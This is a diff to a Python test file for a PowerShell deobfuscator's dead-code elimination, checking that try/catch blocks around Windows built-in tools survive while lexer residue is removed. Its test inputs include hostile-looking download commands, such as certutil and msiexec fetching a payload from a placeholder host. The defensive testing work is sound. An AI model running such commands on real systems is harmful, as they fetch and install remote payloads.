@@ -521,7 +521,7 @@ class TestPs1InjectedNoiseBareword(TestPs1):
         # erased exactly the `try { <LOLBin> } catch { }` shape the rule was rewritten to protect.
         for source in (
             'certutil -urlcache -split -f =http://host/payload.exe',
-            'findstr = C:\\log.txt',
+            'findstr /c:x =y C:\\log.txt',
             'reg add HKCU\\Software\\X /v Y /t REG_SZ /d =Z',
             'setx EVILVAR =1',
         ):
@@ -530,3 +530,40 @@ class TestPs1InjectedNoiseBareword(TestPs1):
                     F"try {{ {source} }} catch {{ }}\nWrite-Host 'keep'",
                     Ps1DeadCodeElimination)
                 self.assertIn('try', result)
+
+
+class TestPs1NoiseBarewordSpellings(TestPs1):
+    """
+    The residue rule deletes a statement and the `try` around it on a guess about a lexer artifact.
+    An artifact is what the lexer leaves when it meets two tokens where a command was expected, so
+    every spelling that only a hand-written command line can produce has to survive the guess.
+    """
+
+    def test_a_quoted_argument_is_not_assignment_residue(self):
+        # Regression: an assignment cannot produce a quoted token, but the marker test read only the
+        # decoded value, so quoting the operand was enough to erase the `try { <LOLBin> } catch { }`
+        # shape the rule exists to protect.
+        for source in (
+            "certutil '=http://host/payload.exe'",
+            'certutil "=http://host/payload.exe"',
+        ):
+            with self.subTest(source):
+                result = self._apply(
+                    F"try {{ {source} }} catch {{ }}\nWrite-Host 'keep'",
+                    Ps1DeadCodeElimination)
+                self.assertIn('try', result)
+
+    def test_a_call_operator_is_not_assignment_residue(self):
+        # `&` is legal only in command position, so an assignment can never carry one.
+        result = self._apply(
+            "try { & msiexec =http://host/p.msi } catch { }\nWrite-Host 'keep'",
+            Ps1DeadCodeElimination)
+        self.assertIn('try', result)
+
+    def test_the_unquoted_two_token_residue_is_still_dropped(self):
+        for source in ('0042DsKaho=8602057', 'Zbc =1', 'aQ=2'):
+            with self.subTest(source):
+                result = self._apply(
+                    F"try {{ {source} }} catch {{ }}\nWrite-Host 'keep'",
+                    Ps1DeadCodeElimination)
+                self.assertEqual(result, "Write-Host 'keep'")
